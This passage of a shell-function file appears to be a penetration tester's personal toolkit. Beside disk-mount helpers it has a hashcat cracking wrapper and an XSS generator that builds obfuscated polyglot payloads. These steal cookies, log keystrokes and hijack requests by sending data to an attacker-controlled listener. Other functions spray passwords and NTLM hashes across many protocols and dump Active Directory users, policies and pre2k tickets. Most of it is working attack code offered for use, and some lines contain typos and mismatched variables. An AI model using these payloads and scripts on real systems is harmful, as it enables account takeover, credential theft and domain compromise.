    if ! sudo qemu-nbd -r --connect=/dev/nbd0 "$1"; then
        echo "Failed to connect to NBD device"
        echo "Trying alternative approach..."
        sudo qemu-nbd -r -c /dev/nbd0 "$1" || {
            echo "Error: Could not connect $1 to /dev/nbd0"
            return 1
        }
    fi
    
    # Wait for device to be ready
    sleep 2
    
    # Check if device exists
    if [[ ! -b /dev/nbd0 ]]; then
        echo "Error: /dev/nbd0 block device not created"
        return 1
    fi
    
    # Create partition mappings
    if ! sudo kpartx -av /dev/nbd0; then
        echo "Error: Failed to create partition mappings"
        sudo qemu-nbd -d /dev/nbd0
        return 1
    fi
    
    # Wait for partitions to appear
    sleep 2
    
    # Try to mount the first partition automatically
    if [[ -b /dev/mapper/nbd0p1 ]]; then
        if sudo mount -t ntfs-3g /dev/mapper/nbd0p1 /mnt/my_vhs 2>/dev/null; then
            echo "Successfully mounted to /mnt/my_vhs"
            return 0
        else
            echo "Mount failed, trying alternative methods..."
            # Try mounting as read-only
            if sudo mount -t ntfs-3g -o ro /dev/mapper/nbd0p1 /mnt/my_vhs 2>/dev/null; then
                echo "Mounted as read-only to /mnt/my_vhs"
                return 0
            fi
        fi
    fi
    
    # If automatic mount failed
    echo "Could not automatically mount partition."
    echo "Available devices:"
    ls /dev/nbd0* /dev/mapper/nbd0* 2>/dev/null || echo "No devices found"
    
    echo "You can try mounting manually with:"
    echo "sudo mount -t ntfs-3g /dev/mapper/nbd0pX /mnt/my_vhs"
    echo "Or for read-only access:"
    echo "sudo mount -t ntfs-3g -o ro /dev/mapper/nbd0pX /mnt/my_vhs"
    return 1
}

# Bitlocker Mounting
bitmount(){
    if [[ $# -eq 0 ]]; then;
        echo -e "\nUsage: bitmount [FILE] [PWD]\n"
        return 1
    fi
    echo -e "\nCLEANING UP PREVIOUS DISKS\n"
    sudo rm -rf /media/bitlocker /media/bitlockermount
    for loop_device in $(losetup --all | grep "$1" | cut -d ':' -f 1)
    do
        echo "Detaching ${loop_device}..."
        sudo losetup -d "${loop_device}"
    done

    echo -e "\nMOUNTING \"$1\" WITH PASSWORD \"$2\"\n"
    sudo mkdir -p /media/bitlocker; sudo mkdir -p /media/bitlockermount
    sudo losetup -f -P $1
    disk=$(losetup --all | grep "$1" | awk '{print $1}' | head -n 1 | tr -d ':')
    sudo dislocker ${disk}p1 -u$2 -- /media/bitlocker
    sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount

    echo -e "\nCD AND LISTING CONTENT\n"
    cd /media/bitlockermount && sudo ls -la .
}


# SMB share mount
smbmount() {
    local ip="" user="" pass="" share=""
    
    # Parse arguments
    while [[ $# -gt 0 ]]; do
        case "$1" in
            -u|--user)
                user="$2"
                shift 2
                ;;
            -p|--pass)
                pass="$2"
                shift 2
                ;;
            *)
                if [[ -z "$ip" ]]; then
                    ip="$1"
                else
                    echo "Unknown argument: $1"
                    return 1
                fi
                shift
                ;;
        esac
    done

    # Check if IP is provided
    if [[ -z "$ip" ]]; then
        echo "Usage: smbmount <IP> -u <user> -p <pass>"
        return 1
    fi

    # Ask user to select a share
    vared -p "Select a share to mount: " -c share

    # Create mount point and mount
    local mount_point="/mnt/$share"
    sudo mkdir -p "$mount_point"
    sudo mount -t cifs "//$ip/$share" "$mount_point" -o username="$user",password="$pass"

    # Check if mount succeeded
    if mount | grep -q "$mount_point"; then
        echo "Successfully mounted //$ip/$share at $mount_point"
        cd $mount_point
    else
        echo "Failed to mount //$ip/$share"
        return 1
    fi
}

# Hashcat cracking
hashcrack() {
    local hash_file="$1"
    local wordlist="${2:-$HOME/wordlists/rockyou.txt}"

    # --- 1. Validate inputs ---
    if [[ -z "$hash_file" ]]; then
        echo "[!] Error: You must provide a hash file." >&2
        echo "Usage: hashcrack <hash_file> [wordlist_file]" >&2
        return 1
    fi
    if [[ ! -f "$hash_file" ]]; then
        echo "[!] Error: Hash file not found at '$hash_file'" >&2
        return 1
    fi
    if [[ ! -f "$wordlist" ]]; then
        echo "[!] Error: Wordlist not found at '$wordlist'" >&2
        return 1
    fi

    # --- PHASE 1: Get all suggested modes and store them in an array ---
    echo "[*] Getting hash mode suggestions or cracking directly using hashcat..."
    local suggested_modes_string
    # We run hashcat once just to get the suggestions.
    suggested_modes_string=$(hashcat "$hash_file" "$wordlist" 2>&1 | grep -oE '^[[:space:]]*[0-9]+' | tr -d ' ' | paste -sd ' ' -)

    if [[ -z "$suggested_modes_string" ]]; then
        echo "[!] No hash mode suggestions found. Please check your hash file or hashcat's output." >&2
        return 1
    fi

    local -a modes_array
    read -r -A modes_array <<< "$suggested_modes_string" # For Zsh, -A is often used. For Bash, -a. Let's make it compatible.
    
    # A more universally compatible way for both shells:
    local modes_array=("${(@s/ /)suggested_modes_string}") # Zsh specific way
    if [[ -n "$BASH_VERSION" ]]; then
      read -r -a modes_array <<< "$suggested_modes_string" # Bash specific way
    fi


    echo "[*] Found suggested hash modes to try: ${modes_array[*]}"
    # --- PHASE 2: Iterate through the array and run hashcat for each mode ---
    for mode in "${modes_array[@]}"; do
        echo
        echo "============================================================"
        echo "[*] Trying hash mode: $mode"
        echo "============================================================"

        /home/damuna/tools/HASHCAT/hashcat-7.1.2/hashcat.bin -m "$mode" "$hash_file" "$wordlist" --force

        # Check for cracked hashes after the run is complete.
        local cracked
        cracked=$(hashcat -m "$mode" --show "$hash_file")

        if [[ -n "$cracked" ]]; then
            echo
            echo "[+] SUCCESS! Hash cracked with mode: $mode"
            echo "[+] Cracked hash(es):"
            echo "$cracked"
            return 0 # Success! Exit the function.
        else
            echo "[-] Hash not cracked with mode: $mode. Trying next mode..."
        fi
    done

    echo
    echo "[!] Exhausted all suggested hash modes. The hash could not be cracked with the provided wordlist."
    return 1
}


# XSS Exploit generator using obfuscated polyglot
xssgen() {
    chnic
    read -r lport\?"[+] INPUT HTTP PORT: "

    echo -e "\n[+] COOKIE STEALING\n"
    b64_cookie=$(echo "fetch('http://$ip:$lport/?cookie='+btoa(document.cookie));" | base64 -w0)
    echo "jaVasCript:/*-/*\`/*\\\\\`/*'/*\"/**/(/**/OnFOCus=\\\\u0065val(atob('$b64_cookie')) AuTOFOcus TabINDEx=1)//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--\!>\\\\x3cA/<A/oNFoCUs=\\\\u0065val(atob('$b64_cookie')) AuTOFocus TaBIndeX=1//>\\\\x3e"
    echo -e "\n[+] SIMPLE PAYLOADS (Cookie Stealing):\n"
    echo "<img/src=x/onerror=eval(atob('$b64_cookie'))>"
    echo "<script/src=\"data:;base64,$b64_cookie\"></script>"
    echo "<svg/onload=eval(atob(\"$b64_cookie\"));>"
    echo -e "\n[+] KEY LOGGING\n"
    b64_key=$(echo "document.onkeypress=e=>fetch('http://$ip:$lport/?keystroke='+e.key)" | base64 -w0)
    echo "jaVasCript:/*-/*\`/*\\\\\`/*'/*\"/**/(/**/OnFOCus=\\\\u0065val(atob('$b64_key')) AuTOFOcus TabINDEx=1)//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--\!>\\\\x3cA/<A/oNFoCUs=\\\\u0065val(atob('$b64_key')) AuTOFocus TaBIndeX=1//>\\\\x3e"

    echo ""
    read -r req\?"[+] INPUT REQUEST FILE TO HIJACK VIA XHR (blank to skip): "
    read -r cross\?"[+] IS THE REQUEST CROSS-DOMAIN? (Y/N): "
    if [[ -f $req ]]; then
        method=$(head -n 1 $req | awk '{print $1}')
        pth=$(head -n 1 $req | awk '{print $2}')
        host=$(grep ^Host $req | awk '{print $2}')
        content_type=$(grep ^Content-Type $req | awk '{print $2}')
        post_data=$(awk 'BEGIN {p=0} /^$/ {p=1; next} p {printf "%s", $0}' $req | tr -d ' ')
        xhr_url="http://${host}${pth}"

        cross=""
        csrf=""
        if [[ $cross =~ [yY] ]]; then
            cross="x.withCredentials = true;"
            read -r csrf_url\?"[+] INPUT URL TO STEAL CSRF TOKEN (blank if none): "
            if [[ ! -z $csrf_url ]]; then
                read -r csrf_name\?"[+] INPUT NAME OF CSRF TOKEN: "
                csrf="x.open('GET','$csrf_url',false);x.send(null);regx = /${csrf_name}\" value=\"(.*)\"/g;token = regx.exec(x.responseText)[1];"
                #TODO: EMBED CSRF TOKEN IN QUERY / POST DATA OF THE XHR HIJACKED REQUEST
            fi
        fi

        if [[ $method == "GET" ]]; then
            b64_key=$(echo "var x=new XMLHttpRequest();${cross}x.onreadystatechange=function(){if(x.readyState==4)fetch(\"http://$ip:$port/?response\"+btoa(x.responseText))};x.open(\"$method\",\"$xhr_url\",false);x.send(null);")
        fi
        if [[ $method == "POST" ]]; then
            b64_key=$(echo "var x=new XMLHttpRequest();${cross}x.onreadystatechange=function(){if(x.readyState==4)fetch(\"http://$ip:$port/?response\"+btoa(x.responseText))};x.open(\"$method\",\"$xhr_url\",false);x.setRequestHeader('Content-type','$content_type');x.send('$post_data');")
        fi
        echo -e "----------------------------------"
        echo -e "$b64_key"
        echo -e "----------------------------------"
        echo -e "\n[+] XHR FORGERY\n"
        b64_xhr=$(echo $b64_key | base64 -w0)
        echo -e "jaVasCript:/*-/*\`/*\\\\\`/*'/*\"/**/(/**/OnFOCus=\\\\u0065val(atob('$b64_xhr')) AuTOFOcus TabINDEx=1)//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--\!>\\\\x3cA/<A/oNFoCUs=\\\\u0065val(atob('$b64_xhr')) AuTOFocus TaBIndeX=1//>\\\\x3e"

    fi

    echo -e "\n[+] OPENING HTTP SERVER ON \"http://$ip:$lport\"\n"
    python3 -m http.server $lport >/dev/null
}


# NXC Spraying Wrapper
nxcspray(){

    if [[ $# -eq 0 ]]; then
        echo "Usage: nxcspray <target> <user> <pass|hash> {<domain>} {<DC FQDN>}"
        return 1
    fi
    
    dc_ip="$4"
    dc_fqdn="$5"
    protocols=("smb" "winrm" "rdp" "mssql" "ldap" "vnc" "wmi" "nfs" "ftp" "ssh")
    loc_protocols=("smb" "winrm" "rdp" "mssql")


    echo -e "\n[+] - Domain Authentication"
    for protocol in "${protocols[@]}"; do
        if [[ $3 == $2 ]]; then
            echo -e "[+] - USER:USER Mode Detected\n"
            nxc $protocol $1 -u $2 -p $3 --continue-on-success --no-bruteforce | stdbuf -oL grep --color=never "+\|STATUS_NOT_SUPPORTED\|STATUS_ACCOUNT_RESTRICTION\|LOGON_TYPE_NOT_GRANTED\|CLIENT_CREDENTIALS_REVOKED\|STATUS_ACCOUNT_DISABLED\|PASSWORD_MUST_CHANGE\|STATUS_PASSWORD_EXPIRED" | stdbuf -oL tee -a /tmp/spray_$1.txt
        elif [[ -z $(cat $3 | head -n 1 | grep -E '[0-9a-fA-F]{32}') ]]; then
            nxc $protocol  $1 -u $2 -p $3 --continue-on-success  | stdbuf -oL grep --color=never "+\|STATUS_NOT_SUPPORTED\|STATUS_ACCOUNT_RESTRICTION\|LOGON_TYPE_NOT_GRANTED\|CLIENT_CREDENTIALS_REVOKED\|STATUS_ACCOUNT_DISABLED\|PASSWORD_MUST_CHANGE\|STATUS_PASSWORD_EXPIRED" | stdbuf -oL tee -a /tmp/spray_$1.txt
        else
            nxc $protocol  $1 -u $2 -H $3 --continue-on-success  | stdbuf -oL grep --color=never "+\|STATUS_NOT_SUPPORTED\|STATUS_ACCOUNT_RESTRICTION\|LOGON_TYPE_NOT_GRANTED\|CLIENT_CREDENTIALS_REVOKED\|STATUS_ACCOUNT_DISABLED\|PASSWORD_MUST_CHANGE\|STATUS_PASSWORD_EXPIRED" | stdbuf -oL tee -a /tmp/spray_$1.txt
        fi
        cat /tmp/spray_$1.txt | grep + | awk '{print $6}' | awk -F"\\\\" '{print $2}' | awk -F":" '{print $1}' | sort -u | awk '{print $1 "@'$dom'"}' | anew -q owned.txt
        cat /tmp/spray_$1.txt | grep + | grep "SMB\|LDAP" | grep 'Pwn3d!' | awk '{print $4}' | sort -u | awk '{print $1 ".'$dom'"}' | anew -q owned.txt
    done

    echo -e "\n[+] - Local Authentication"
    for protocol in "${loc_protocols[@]}"; do
        if [[ $3 == $2 ]]; then
            echo -e "[+] - USER:USER Mode Detected\n"
            nxc $protocol  $1 -u $2 -p $3 --continue-on-success --no-bruteforce --local-auth  | stdbuf -oL grep --color=never "+\|STATUS_NOT_SUPPORTED\|STATUS_ACCOUNT_RESTRICTION\|LOGON_TYPE_NOT_GRANTED\|CLIENT_CREDENTIALS_REVOKED\|STATUS_ACCOUNT_DISABLED\|PASSWORD_MUST_CHANGE\|STATUS_PASSWORD_EXPIRED" | stdbuf -oL tee -a /tmp/spray_$1.txt
        elif [[ -z $(cat $3 | head -n 1 | grep -E '[0-9a-fA-F]{32}') ]]; then
            nxc $protocol  $1 -u $2 -p $3 --continue-on-success --local-auth  | stdbuf -oL grep --color=never "+\|STATUS_NOT_SUPPORTED\|STATUS_ACCOUNT_RESTRICTION\|LOGON_TYPE_NOT_GRANTED\|CLIENT_CREDENTIALS_REVOKED\|STATUS_ACCOUNT_DISABLED\|PASSWORD_MUST_CHANGE\|STATUS_PASSWORD_EXPIRED" | stdbuf -oL tee -a /tmp/spray_$1.tx
        else
            nxc $protocol  $1 -u $2 -H $3 --continue-on-success --local-auth  | stdbuf -oL grep --color=never "+\|STATUS_NOT_SUPPORTED\|STATUS_ACCOUNT_RESTRICTION\|LOGON_TYPE_NOT_GRANTED\|CLIENT_CREDENTIALS_REVOKED\|STATUS_ACCOUNT_DISABLED\|PASSWORD_MUST_CHANGE\|STATUS_PASSWORD_EXPIRED" | stdbuf -oL tee -a /tmp/spray_$1.tx
        fi
        cat /tmp/spray_$1.txt | grep + | awk '{print $6}' | awk -F"\\\\" '{print $2}' | awk -F":" '{print $1}' | sort -u | awk '{print $1 "@'$dom'"}' | anew -q owned.txt
        cat /tmp/spray_$1.txt | grep + | awk '{print $4}' | sort -u | awk '{print $1 ".'$dom'"}' | anew -q owned.txt
    done

    if [[ ! -z $dc_fqdn ]]; then
        echo -e "\n[+] - Kerberos Authentication"
        for protocol in "${protocols[@]}"; do
            if [[ $3 == $2 ]]; then
                echo -e "[+] - USER:USER Mode Detected\n"
                nxc $protocol  $1 -u $2 -p $3 --continue-on-success --no-bruteforce -k --kdcHost $dc_fqdn  | stdbuf -oL grep --color=never "+\|STATUS_NOT_SUPPORTED\|STATUS_ACCOUNT_RESTRICTION\|LOGON_TYPE_NOT_GRANTED\|CLIENT_CREDENTIALS_REVOKED\|STATUS_ACCOUNT_DISABLED\|PASSWORD_MUST_CHANGE\|STATUS_PASSWORD_EXPIRED" | stdbuf -oL tee -a /tmp/spray_$1.tx
            elif [[ -z $(cat $3 | head -n 1 | grep -E '[0-9a-fA-F]{32}') ]]; then
                nxc $protocol  $1 -u $2 -p $3 -k --kdcHost $dc_fqdn --continue-on-success  | stdbuf -oL grep --color=never "+\|STATUS_NOT_SUPPORTED\|STATUS_ACCOUNT_RESTRICTION\|LOGON_TYPE_NOT_GRANTED\|CLIENT_CREDENTIALS_REVOKED\|STATUS_ACCOUNT_DISABLED\|PASSWORD_MUST_CHANGE\|STATUS_PASSWORD_EXPIRED" | stdbuf -oL tee -a /tmp/spray_$1.tx
            else
                nxc $protocol  $1 -u $2 -H $3 -k --kdcHost $dc_fqdn --continue-on-success  | stdbuf -oL grep --color=never "+\|STATUS_NOT_SUPPORTED\|STATUS_ACCOUNT_RESTRICTION\|LOGON_TYPE_NOT_GRANTED\|CLIENT_CREDENTIALS_REVOKED\|STATUS_ACCOUNT_DISABLED\|PASSWORD_MUST_CHANGE\|STATUS_PASSWORD_EXPIRED" | stdbuf -oL tee -a /tmp/spray_$1.tx
            fi
            cat /tmp/spray_$1.txt | grep + | awk '{print $6}' | awk -F"\\\\" '{print $2}' | awk -F":" '{print $1}' | sort -u | awk '{print $1 "@'$dom'"}' | anew -q owned.txt
            cat /tmp/spray_$1.txt | grep + | awk '{print $4}' | sort -u | awk '{print $1 ".'$dom'"}' | anew -q owned.txt
        done
    fi
}

# NXC Domain Dumper
# NXC Domain Dumper
domdump(){
    dom=$(cat /etc/hosts | grep -i $1 | awk '{print $3}' | head -n 1)
    if [[ -z $2 ]]; then
        read -r usr_kb\?"[+] BRUTEFORCING MODE DETECTED, INPUT USER WORDLIST (DEFAULT: top-formats.txt): "
        if [[ -z $usr_kb ]]; then
            usr_kb="/home/kali/wordlists/STATISTICALLY_LIKELY/top-formats.txt"
        fi
        dombrute $1 $usr_kb
        return 1
    fi
    if [[ -f $3 ]]; then
        kbload $3
        echo -e "\n[+] ATTEMPTING RPC DUMPING\n"
        mkdir -p RPC_DATA && cd RPC_DATA
        rpcclient --use-kerberos -N $1 -c "querydispinfo" > RPC_USERS_DESCRIPTIONS_$1.txt 2>/dev/null
        rpcclient --use-kerberos -N $1 -c "getdompwinfo" > RPC_PASS_POL_$1.txt 2>/dev/null
        rpcclient --use-kerberos -N $1 -c "enumdomusers" 2>/dev/null | awk -F"[][]" '{print $2}' | tee -a RPC_USERS_$1.txt
        rpcclient --use-kerberos -N $1 -c "enumprinters" > RPC_PRINTERS_$1.txt 2>/dev/null
        if [[ -s RPC_USERS_$1.txt ]]; then
            cat RPC_USERS_$1.txt | anew -q ../users.txt
            echo -e "\n[+] GETTING QUERYUSER DATA FOR ALL USERS\n"
            cd RPC_DATA
            while read user; do
                rpcclient --use-kerberos -N $1 -c "queryuser $user" > RPC_USERS_DATA_$1.txt 2>/dev/null
            done < ../users.txt
        fi
        cd ..
        find ./RPC_DATA -type f -empty -delete; rmdir ./RPC_DATA 2>/dev/null

        echo -e "\n[+] ATTEMPTING LDAP DUMPING\n"
        mkdir -p LDAP_DATA && cd LDAP_DATA
        nxc ldap $1 --use-kcache --query "(|(sAMAccountType=805306368)(samaccounttype=805306369))" "samaccountname" | grep -i samaccountname | awk '{print $6}' | tee -a LDAP_USERS_$1.txt
        nxc ldap $1 --use-kcache --query "(|(sAMAccountType=805306368)(samaccounttype=805306369))" "" | sed -E 's/^LDAP\s+\S+\s+\S+\s+\S+\s+//' | awk '/\\[\\+] Response for object:/ { if (p) print p; p="" } { p = p ? p"\n"$0 : $0 } END { print p }' | grep -v "msDS-SupportedEncryptionTypes\|lastLogonTimestamp\|dSCorePropagationData\|isCriticalSystemObject\|objectCategory\|servicePrincipalName\|sAMAccountType\|logonCount\|accountExpires\|objectSid\|primaryGroupID\|pwdLastSet\|localPolicyFlags\|lastLogon\|lastLogoff\|badPasswordTime\|countryCode\|codePage\|badPwdCount\|userAccountControl\|objectGUID\|name\|uSNChanged\|uSNCreated\|whenChanged\|whenCreated\|instanceType\|distinguishedName\|cn\|objectClass\|dNSHostName\|operatingSystem\|operatingSystemVersion\|logonHours\|displayName\|givenName\|msDFSR-ComputerReferenceBL\|msDS-GenerationId\|rIDSetReferences\|serverReferenceBL\|showInAdvancedViewOnly\|servicePrincipalName" | awk '/\\[\\+] Response for object:/ || NF >= 2' | grep -v ^CN= | sed 's/\[+] Response for object:/\n&/' > LDAP_USER_PROPERTIES_$1.txt

        echo -e "\n[+] DOMAIN PASSWORD POLICY\n"
        nxc ldap $1 --use-kcache --query "(objectClass=domainDNS)" "minPwdLength lockoutThreshold" | tee -a LDAP_PASS_POL_$1.txt

        echo -e "\n[+] DOMAIN TRUST DATA\n"
        nxc ldap $1 --use-kcache --dc-list 
        
        echo -e "\n[+] GETTING MAQ\n"
        nxc ldap $1 --use-kcache -M maq

        echo -e "\n[+] ATTEMPTING PRE2K TAKEOVER\n"
        rm /home/kali/.nxc/modules/pre2k/ccache/* && nxc ldap $1 --use-kcache -M pre2k && mkdir -p ../PRE2K_TGT && cp /home/kali/.nxc/modules/pre2k/ccache/* ../PRE2K_TGT && rmdir ../PRE2K_TGT 2>/dev/null
        ls -la ../PRE2K_TGT/*.ccache | awk '{print $9}' | awk -F"/" '{print $3}' | cut -d'.' -f1 > /tmp/pre2k && while read pc; do echo "${pc:u}.${dom}" | anew -q ../owned.txt; done < /tmp/pre2k

        cat LDAP_USERS_$1.txt | anew -q ../users.txt
        cd ..
        find ./LDAP_DATA -type f -empty -delete; rmdir ./LDAP_DATA 2>/dev/null

        if [[ ! -s LDAP_DATA/LDAP_USERS_$1.txt ]]; then
            echo -e "\n[+] GETTING SMB USERS\n"
            mkdir -p SMB_DATA && cd SMB_DATA
            nxc smb $1 --use-kcache --users-export SMB_USERS_$1.txt
            if [[ -s SMB_USERS_$1.txt ]]; then
                echo -e "\n[+] FOUND SMB USERS\n"
                cat SMB_USERS_$1.txt
                cat SMB_USERS_$1.txt | anew -q ../users.txt
            fi
            cd ..
            find ./SMB_DATA -type f -empty -delete; rmdir ./SMB_DATA 2>/dev/null
            echo -e "\n[+] DOMAIN PASSWORD POLICY\n"
            nxc smb $1 --use-kcache --pass-pol

            echo -e "\n[+] ATTEMPTING RID CYCLING\n"
            mkdir -p RID_CYCLE && cd RID_CYCLE
            dom=$(nxc ldap $1 | tr '(' '\n' | grep -i domain | awk -F":" '{print $2}' | tr -d ')')
            lookupsid.py $dom/@$1 -k -dc-ip $1 -no-pass 10000 | grep SidTypeUser | awk -F'\\\\|\\(' '{print $2}' | tee -a RID_USERS_$1.txt

            protocols=("smb" "mssql")
            for protocol in "${protocols[@]}"; do
                nxc $protocol $1 --use-kcache --rid-brute 10000 | grep SidTypeUser | awk '{print $6}' | awk -F'\\\\|\\(' '{print $2}' | tee -a RID_USERS_$1.txt
            done
            cat RID_USERS_$1.txt | anew -q ../users.txt
            cd ..
            find ./RID_CYCLE -type f -empty -delete; rmdir ./RID_CYCLE 2>/dev/null
        fi

        echo -e "\n[+] SAVED UNIQUE USERNAMES FOUND IN \"users.txt\"\n"

        delegfind $1 $2 $3
        certfind $1 $2 $3
        nxcblood $1 $2 $3
        domroast $1 $2 $3

    elif [[ -z $(echo $3 | grep -E '[0-9a-fA-F]{32}') ]]; then
        echo -e "\n[+] ATTEMPTING RPC DUMPING\n"
        mkdir -p RPC_DATA && cd RPC_DATA
        rpcclient -U $2%$3 -N $1 -c "querydispinfo" > RPC_USERS_DESCRIPTIONS_$1.txt 2>/dev/null
        rpcclient -U $2%$3 -N $1 -c "getdompwinfo" > RPC_PASS_POL_$1.txt 2>/dev/null
        rpcclient -U $2%$3 -N $1 -c "enumdomusers" 2>/dev/null | awk -F"[][]" '{print $2}' | tee -a RPC_USERS_$1.txt
        rpcclient -U $2%$3 -N $1 -c "enumprinters" > RPC_PRINTERS_$1.txt 2>/dev/null

        if [[ -s RPC_USERS_$1.txt ]]; then
            cat RPC_USERS_$1.txt | anew -q ../users.txt
            echo -e "\n[+] GETTING QUERYUSER DATA FOR ALL USERS\n"
            cd RPC_DATA
            while read user; do
                rpcclient -U $2%$3 -N $1 -c "queryuser $user" > RPC_USERS_DATA_$1.txt 2>/dev/null
            done < ../users.txt
        fi
        cd ..
        find ./RPC_DATA -type f -empty -delete; rmdir ./RPC_DATA 2>/dev/null

        echo -e "\n[+] ATTEMPTING LDAP DUMPING\n"
        mkdir -p LDAP_DATA && cd LDAP_DATA
        nxc ldap $1 -u $2 -p $3 --query "(|(sAMAccountType=805306368)(samaccounttype=805306369))" "samaccountname" | grep -i samaccountname | awk '{print $6}' | tee -a LDAP_USERS_$1.txt
        nxc ldap $1 -u $2 -p $3 --query "(|(sAMAccountType=805306368)(samaccounttype=805306369))" "" | sed -E 's/^LDAP\s+\S+\s+\S+\s+\S+\s+//' | awk '/\\[\\+] Response for object:/ { if (p) print p; p="" } { p = p ? p"\n"$0 : $0 } END { print p }' | grep -v "msDS-SupportedEncryptionTypes\|lastLogonTimestamp\|dSCorePropagationData\|isCriticalSystemObject\|objectCategory\|servicePrincipalName\|sAMAccountType\|logonCount\|accountExpires\|objectSid\|primaryGroupID\|pwdLastSet\|localPolicyFlags\|lastLogon\|lastLogoff\|badPasswordTime\|countryCode\|codePage\|badPwdCount\|userAccountControl\|objectGUID\|name\|uSNChanged\|uSNCreated\|whenChanged\|whenCreated\|instanceType\|distinguishedName\|cn\|objectClass\|dNSHostName\|operatingSystem\|operatingSystemVersion\|logonHours\|displayName\|givenName\|msDFSR-ComputerReferenceBL\|msDS-GenerationId\|rIDSetReferences\|serverReferenceBL\|showInAdvancedViewOnly\|servicePrincipalName" | awk '/\\[\\+] Response for object:/ || NF >= 2' | grep -v ^CN= | sed 's/\[+] Response for object:/\n&/' > LDAP_USER_PROPERTIES_$1.txt

        echo -e "\n[+] DOMAIN PASSWORD POLICY\n"
        nxc ldap $1 -u $2 -p $3 --query "(objectClass=domainDNS)" "minPwdLength lockoutThreshold" | tee -a LDAP_PASS_POL_$1.txt

        echo -e "\n[+] DOMAIN TRUST DATA\n"
        nxc ldap $1 -u $2 -p $3 --dc-list 

        echo -e "\n[+] GETTING MAQ\n"
        nxc ldap $1 -u $2 -p $3 -M maq

        echo -e "\n[+] DUMPING ADI-DNS ZONES\n"
        adidnsdump -u "$dom\\\\$2" -p $3 --print-zones $1 --dns-tcp -r

        echo -e "\n[+] ATTEMPTING PRE2K TAKEOVER\n"
        sudo rm /home/kali/.nxc/modules/pre2k/ccache/* && nxc ldap $1 -u $2 -p $3 -k -M pre2k && mkdir -p ../PRE2K_TGT && cp /home/kali/.nxc/modules/pre2k/ccache/* ../PRE2K_TGT && rmdir ../PRE2K_TGT 2>/dev/null
        ls -la ../PRE2K_TGT/*.ccache | awk '{print $9}' | awk -F"/" '{print $3}' | cut -d'.' -f1 > /tmp/pre2k && while read pc; do echo "${pc:u}.${dom}" | anew -q ../owned.txt; done < /tmp/pre2k

        cat LDAP_USERS_$1.txt | anew -q ../users.txt
        cd ..
        find ./LDAP_DATA -type f -empty -delete; rmdir ./LDAP_DATA 2>/dev/null

        if [[ ! -s LDAP_DATA/LDAP_USERS_$1.txt ]]; then
            echo -e "\n[+] GETTING SMB USERS\n"
            mkdir -p SMB_DATA && cd SMB_DATA
            nxc smb $1 -u $2 -p $3 --users-export SMB_USERS_$1.txt
            if [[ -s SMB_USERS_$1.txt ]]; then
                echo -e "\n[+] FOUND SMB USERS\n"
                cat SMB_USERS_$1.txt
                cat SMB_USERS_$1.txt | anew -q ../users.txt
            fi
            echo -e "\n[+] DOMAIN PASSWORD POLICY\n"
            nxc smb $1 -u $2 -p $3 --pass-pol

            cd ..
            find ./SMB_DATA -type f -empty -delete; rmdir ./SMB_DATA 2>/dev/null

            echo -e "\n[+] ATTEMPTING RID CYCLING\n"
            mkdir -p RID_CYCLE && cd RID_CYCLE
            dom=$(nxc ldap $1 | tr '(' '\n' | grep -i domain | awk -F":" '{print $2}' | tr -d ')')
            lookupsid.py $dom/$2:$3@$1 -dc-ip $1 -no-pass 10000 | grep SidTypeUser | awk -F'\\\\|\\(' '{print $2}' | tee -a RID_USERS_$1.txt

            protocols=("smb" "mssql")
            for protocol in "${protocols[@]}"; do
                nxc $protocol $1 -u $2 -p $3 --rid-brute 10000 | grep SidTypeUser | awk '{print $6}' | awk -F'\\\\|\\(' '{print $2}' | tee -a RID_USERS_$1.txt
            done
            cat RID_USERS_$1.txt | anew -q ../users.txt
            cd ..
            find ./RID_CYCLE -type f -empty -delete; rmdir ./RID_CYCLE 2>/dev/null
        fi

        echo -e "\n[+] SAVED UNIQUE USERNAMES FOUND IN \"users.txt\"\n"

        delegfind $1 $2 $3
        certfind $1 $2 $3
        nxcblood $1 $2 $3
        domroast $1 $2 $3

    elif [[ ! -z $(echo $3 | grep -E '[0-9a-fA-F]{32}') ]]; then
        echo -e "\n[+] ATTEMPTING RPC DUMPING\n"
        mkdir -p RPC_DATA && cd RPC_DATA
        rpcclient -U $2 --password=$3 --pw-nt-hash -N $1 -c "querydispinfo" > RPC_USERS_DESCRIPTIONS_$1.txt 2>/dev/null
        rpcclient -U $2 --password=$3 --pw-nt-hash -N $1 -c "enumdomusers" 2>/dev/null | awk -F"[][]" '{print $2}' | tee -a RPC_USERS_$1.txt
        rpcclient -U $2 --password=$3 --pw-nt-hash -N $1 -c "enumprinters" > RPC_PRINTERS_$1.txt 2>/dev/null
        rpcclient -U $2 --password=$3 --pw-nt-hash -N $1 -c "getdompwinfo" > RPC_PASS_POL_$1.txt 2>/dev/null
        if [[ -s RPC_USERS_$1.txt ]]; then
            cat RPC_USERS_$1.txt | anew -q ../users.txt

            echo -e "\n[+] GETTING QUERYUSER DATA FOR ALL USERS\n"
            cd RPC_DATA
            while read user; do
                rpcclient -U $2 --password=$3 --pw-nt-hash -N $1 -c "queryuser $user" > RPC_USERS_DATA_$1.txt 2>/dev/null
            done < ../users.txt
        fi
        cd ..
        find ./RPC_DATA -type f -empty -delete; rmdir ./RPC_DATA 2>/dev/null

        mkdir -p LDAP_DATA && cd LDAP_DATA
        echo -e "\n[+] ATTEMPTING LDAP DUMPING\n"
        nxc ldap $1 -u $2 -H $3 --query "(|(sAMAccountType=805306368)(samaccounttype=805306369))" "samaccountname" | grep -i samaccountname | awk '{print $6}' | tee -a LDAP_USERS_$1.txt
